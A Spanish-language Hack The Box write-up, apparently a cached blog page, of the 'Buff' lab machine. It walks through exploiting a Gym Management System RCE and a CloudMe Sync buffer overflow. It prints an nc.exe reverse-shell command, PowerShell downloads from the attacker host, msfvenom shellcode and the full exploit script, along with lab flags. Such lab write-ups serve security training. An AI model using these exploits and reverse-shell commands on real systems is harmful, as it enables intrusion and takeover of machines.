@@ -1,0 +1,529 @@
+I"�d<h2 id="resumen">Resumen:</h2>
+
+<p>Empezamos Buff obteniendo una shell inversa a través de una <a href="https://www.exploit-db.com/exploits/48506"><strong>vulnerabilidad</strong></a> RCE del <code class="language-plaintext highlighter-rouge">CMS: Gym Management System 1.0</code> que corre en el puerto 8080.</p>
+
+<p>Para escalar privilegios a administrador necesitaremos explotar el servicio <code class="language-plaintext highlighter-rouge">CloudMe</code> usando un <a href="https://www.exploit-db.com/exploits/44470"><strong>exploit</strong></a> que se aprovechará del desbordamiento de buffer que nos permitira obtener un reverse shell.</p>
+
+<p>Como siguiente paso, <code class="language-plaintext highlighter-rouge">Chisel</code> nos ayudara para hacer <code class="language-plaintext highlighter-rouge">portforwarding</code> y acceder al servicio CloudMe en nuestra propia máquina.</p>
+
+<p>Generamos con msfvenom nuestro shellcode, remplazamos el payload del exploit con el nuestro y ejecutamos para finalmente obtener nuestra conexión como <code class="language-plaintext highlighter-rouge">admin</code>.</p>
+
+<hr />
+
+<h2 id="pwned">Pwned</h2>
+<link rel="stylesheet" type="text/css" href="/assets/css/asciinema-player.css" />
+
+<asciinema-player src="/htb/buff/2.cast" cols="107" rows="24"></asciinema-player>
+<script type="text/javascript" src="/assets/js/asciinema-player.js"></script>
+
+<hr />
+
+<h2 id="reconocimiento">Reconocimiento</h2>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre><span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-18 17:51 EST
+Nmap scan report for 10.10.10.198
+Host is up (0.31s latency).
+Not shown: 999 filtered ports
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+|_http-title: mrb3n's Bro Hut
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 52.08 seconds
+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<hr />
+<p>Luego de una enumeración básica, encontramos información útil en el puerto <code class="language-plaintext highlighter-rouge">8080</code>, donde nos damos cuenta de que es una web hecha con el cms <code class="language-plaintext highlighter-rouge">Gym Management Software 1.0</code>. 
+<img src="/htb/buff/1.png" alt="Desktop View" /></p>
+
+<p>Con searchsploit encontramos un exploit disponible para el cms en la version 1.0, El cual podemos aprovechar para poder ejecutar comandos.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="gp">kali@kali:~$</span><span class="w"> </span>searchsploit gym
+<span class="go">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                               |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Gym Management System 1.0 - Unauthenticated Remote Code Execution                                                                            | php/webapps/48506.py
+WordPress Plugin WPGYM - SQL Injection                                                                                                       | php/webapps/42801.txt
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<hr />
+<h2 id="explotando-el-cms">Explotando el CMS</h2>
+
+<p>Ejecutamos el exploit para obtener una shell.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="gp">kali@kali:~/Documents/hackthebox/buff$</span><span class="w"> </span>python 48506.py http://10.10.10.198:8080/
+<span class="go">            /\
+/vvvvvvvvvvvv \--------------------------------------,
+`^^^^^^^^^^^^ /============BOKU====================="
+            \/
+
+[+] Successfully connected to webshell.
+</span><span class="gp">C:\xampp\htdocs\gym\upload&gt;</span><span class="w"> 
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<hr />
+
+<h2 id="usertxt">User.txt</h2>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="gp">C:\xampp\htdocs\gym\upload&gt;</span><span class="w"> </span><span class="nb">type</span> <span class="se">\u</span>sers<span class="se">\s</span>haun<span class="se">\d</span>esktop<span class="se">\u</span>ser.txt
+<span class="go">9dfb44fec478b66cd90565d035a1a972
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<asciinema-player src="/htb/buff/1.cast" cols="100" rows="20"></asciinema-player>
+
+<p>Ahora que obtuvimos el primer <code class="language-plaintext highlighter-rouge">flag</code>, toca trabajar en la escalación de privilegios para ello usamos el <code class="language-plaintext highlighter-rouge">nc.exe</code> y creamos una conexión reversa a nuestra máquina.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="gp">kali@kali:~$</span><span class="w"> </span><span class="nb">cd</span> /usr/share/windows-binaries
+<span class="gp">kali@kali:/usr/share/windows-binaries$</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 4848
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Descargamos el archivo en la máquina de la víctima.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="gp">C:\xampp\htdocs\gym\upload&gt;</span><span class="w"> </span>powershell <span class="nt">-c</span> <span class="s2">"wget 10.10.14.179:4848/nc.exe -o nc.exe"</span>  
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<hr />
+
+<h2 id="reverse-shell-con-netcat">Reverse Shell con Netcat</h2>
+
+<p>Máquina Atacante.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="gp">kali@kali:~$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 1234
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Máquina de la víctima.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="gp">C:\xampp\htdocs\gym\upload&gt;</span><span class="w"> </span>nc.exe <span class="nt">-e</span> cmd.exe 10.10.14.45 1234	 
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="root-privesc">Root Privesc</h2>
+
+<p>Después de enumerar un poco, encontramos en la carpeta de descargas del <code class="language-plaintext highlighter-rouge">usuario</code> shaun un ejecutable <code class="language-plaintext highlighter-rouge">CloudMe_1112.exe</code>.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre><span class="gp">C:\Users\shaun\Downloads&gt;</span><span class="w"> </span><span class="nb">dir</span>
+<span class="go">dir
+Volume in drive C has no label.
+Volume Serial Number is A22D-49F7
+
+Directory of C:\Users\shaun\Downloads
+
+</span><span class="gp">14/07/2020  13:27    &lt;DIR&gt;</span><span class="w">          </span><span class="nb">.</span>
+<span class="gp">14/07/2020  13:27    &lt;DIR&gt;</span><span class="w">          </span>..
+<span class="go">16/06/2020  16:26        17,830,824 CloudMe_1112.exe
+1 File(s)     17,830,824 bytes
+2 Dir(s)   9,843,556,352 bytes free    
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Básicamente CloudMe Sync es una aplicación de sincronización la cual sincroniza su almacenamiento local con el almacenamiento en la nube, y está a la escucha en el puerto <code class="language-plaintext highlighter-rouge">8888</code>.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre><span class="gp">root@kali:~#</span><span class="w"> </span>searchsploit cloudme
+<span class="go">-------------------------------------------------------------------------- ---------------------------------
+Exploit Title                                                             |  Path
+-------------------------------------------------------------------------- ---------------------------------
+CloudMe 1.11.2 - Buffer Overflow (PoC)                                    | windows/remote/48389.py
+CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                           | windows/local/48499.txt
+Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                          | windows_x86-64/remote/45197.rb
+CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                   | windows_x86-64/local/45159.py
+CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)            | windows/remote/44175.rb
+CloudMe Sync 1.11.0 - Local Buffer Overflow                               | windows/local/44470.py
+CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                           | windows/remote/46218.py
+CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                  | windows_x86-64/remote/46250.py
+CloudMe Sync &lt; 1.11.0 - Buffer Overflow                                   | windows/remote/44027.py
+CloudMe Sync &lt; 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                | windows_x86-64/remote/44784.py
+-------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Luego de probar un par de exploits, pude encontrar uno que funciono <a href="https://www.exploit-db.com/exploits/44470"><strong>windows/local/44470.py</strong></a> 
+lo que va a hacer es un buffer overflow en la maquina local por lo tanto tendremos que hacer portforwarding y redirigir el puerto 8888 a nuestra máquina para poder ejecutar el exploit y obtener la shell como admin.</p>
+
+<hr />
+<h3 id="msfvenom-shellcode">msfvenom shellcode</h3>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre></td><td class="rouge-code"><pre><span class="gp">kali@kali:~/Documents/hackthebox/buff$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.45 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> c
+<span class="go">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of c file: 1386 bytes
+unsigned char buf[] = 
+"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
+"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
+"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
+"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
+"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
+"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
+"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
+"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
+"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
+"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
+"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
+"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
+"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0e\x2d\x68"
+"\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
+"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
+"\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
+"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"
+"\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
+"\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"
+"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
+"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+</span><span class="gp">"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Una vez generado el payload tenemos que remplazarlo por el del exploit.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+</pre></td><td class="rouge-code"><pre><span class="c1">#######################################################
+# Exploit Title: Local Buffer Overflow on CloudMe Sync v1.11.0
+# Date: 08.03.2018
+# Vendor Homepage: https://www.cloudme.com/en
+# Software Link: https://www.cloudme.com/downloads/CloudMe_1110.exe
+# Category: Local
+# Exploit Discovery: Prasenjit Kanti Paul
+# Web: http://hack2rule.wordpress.com/
+# Version: 1.11.0
+# Tested on: Windows 7 SP1 x86
+# CVE: CVE-2018-7886
+# Solution: Update CloudMe Sync to 1.11.2
+#######################################################
+</span>
+<span class="c1">#Disclosure Date: March 12, 2018
+#Response Date: March 14, 2018
+#Bug Fixed: April 12, 2018
+</span>
+<span class="c1"># Run this file in victim's win 7 sp1 x86 system where CloudMe Sync 1.11.0 has been installed.
+</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="n">target</span><span class="o">=</span><span class="s">"127.0.0.1"</span> 
+
+<span class="n">junk</span><span class="o">=</span><span class="s">"A"</span><span class="o">*</span><span class="mi">1052</span>
+
+<span class="n">eip</span><span class="o">=</span><span class="s">"</span><span class="se">\x7B\x8A\xA9\x68</span><span class="s">"</span>          <span class="c1">#68a98a7b : JMP ESP - Qt5Core.dll
+</span>
+<span class="c1">#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.1 LPORT=4444 -f c
+</span>
+<span class="n">shellcode</span><span class="o">=</span><span class="p">(</span><span class="s">"</span><span class="se">\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0e\xb3\x68</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb</span><span class="s">"</span>
+        <span class="s">"</span><span class="se">\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="n">junk</span><span class="o">+</span><span class="n">eip</span><span class="o">+</span><span class="n">shellcode</span>
+
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="port-forwarding">Port Forwarding</h3>
+
+<p>Ahora usaremos <a href="https://github.com/jpillora/chisel"><strong>Chisel</strong></a> para hacer el portforwarding y poder acceder al puerto 8888 desde nuestra máquina.</p>
+
+<p>Subimos Chisel a la máquina de la víctima.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre><span class="gp">C:\xampp\htdocs\gym\upload&gt;</span>powershell <span class="nt">-c</span> <span class="s2">"wget 10.10.14.179:4747/chisel.exe -o chisel.exe"</span>
+<span class="go">powershell -c "wget 10.10.14.45:8000/chisel.exe -o chisel.exe"
+
+</span><span class="gp">C:\xampp\htdocs\gym\upload&gt;</span><span class="nb">dir</span>
+<span class="go">dir
+Volume in drive C has no label.
+Volume Serial Number is A22D-49F7
+
+Directory of C:\xampp\htdocs\gym\upload
+
+</span><span class="gp">22/07/2020  06:36    &lt;DIR&gt;</span><span class="w">          </span><span class="nb">.</span>
+<span class="gp">22/07/2020  06:36    &lt;DIR&gt;</span><span class="w">          </span>..
+<span class="go">22/07/2020  06:39        10,103,808 chisel.exe
+22/07/2020  06:36                53 kamehameha.php
+22/07/2020  03:34            59,392 nc.exe
+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Chisel Server (Kali):</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="gp">root@kali:~#</span><span class="w"> </span>./chisel server <span class="nt">-p</span> 5000 <span class="nt">--reverse</span> <span class="nt">-v</span>
+<span class="go">2020/07/22 01:41:02 server: Reverse tunnelling enabled
+2020/07/22 01:41:02 server: Fingerprint 95:3b:86:24:ce:2c:67:3c:6d:8a:b1:21:ee:e4:a1:0b
+2020/07/22 01:41:02 server: Listening on 0.0.0.0:5000...
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Chisel Client (Buff):</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="gp">C:\xampp\htdocs\gym\upload&gt;</span>.<span class="se">\c</span>hisel.exe client 10.10.14.45:5000 R:8888:127.0.0.1:8888
+<span class="go">.\chisel.exe client 10.10.14.45:5000 R:8888:127.0.0.1:8888
+2020/07/22 06:47:59 client: Connecting to ws://10.10.14.45:5000
+2020/07/22 06:48:00 client: Fingerprint 25:2b:20:a5:31:e8:bb:fc:88:4c:f9:60:3c:7b:34:49
+2020/07/22 06:48:02 client: Connected (Latency 306.5828ms)
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Ahora todo lo que enviemos al puerto 8888 desde nuestra máquina será redirigido al puerto 8888 del localhost de la víctima a través del túnel que crea chisel.</p>
+
+<hr />
+
+<h3 id="buffer-overflow">Buffer Overflow</h3>
+
+<p>Tenemos acceso al puerto 8888 de buff desde nuestra kali, solo nos quedaria ejecutar el exploit y ponernos a la escucha con netcat.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre><span class="gp">root@kali:~#</span><span class="w"> </span>nc <span class="nt">-lvp</span> 4444
+<span class="go">listening on [any] 4444 ...
+10.10.10.198: inverse host lookup failed: Unknown host
+connect to [10.10.14.45] from (UNKNOWN) [10.10.10.198] 49737
+Microsoft Windows [Version 10.0.17134.1550]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+</span><span class="gp">C:\Windows\system32&gt;</span><span class="nb">whoami</span>
+<span class="go">whoami
+buff\administrator
+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="gp">C:\Windows\system32&gt;</span><span class="nb">type</span> <span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
+<span class="go">type \users\administrator\desktop\root.txt
+b1253f49dfa74a22347f4d8fba4adddf
+
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<hr />
+
+<asciinema-player src="/htb/buff/2.cast" cols="107" rows="24"></asciinema-player>
+
+<hr />
+
+<p><img src="/htb/buff/buff.gif" alt="Desktop View" /></p>
+
+<hr />
+
+<h2 id="recursos">Recursos</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Topics</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><a href="https://www.exploit-db.com/exploits/48506"><strong>Gym Management System 1.0 - Unauthenticated Remote Code Execution</strong></a></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="https://github.com/jpillora/chisel"><strong>Chisel</strong></a></td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><a href="https://www.exploit-db.com/exploits/44470"><strong>CloudMe Sync 1.11.0 - Local Buffer Overflow</strong></a></td>
+    </tr>
+  </tbody>
+</table>
+:ET
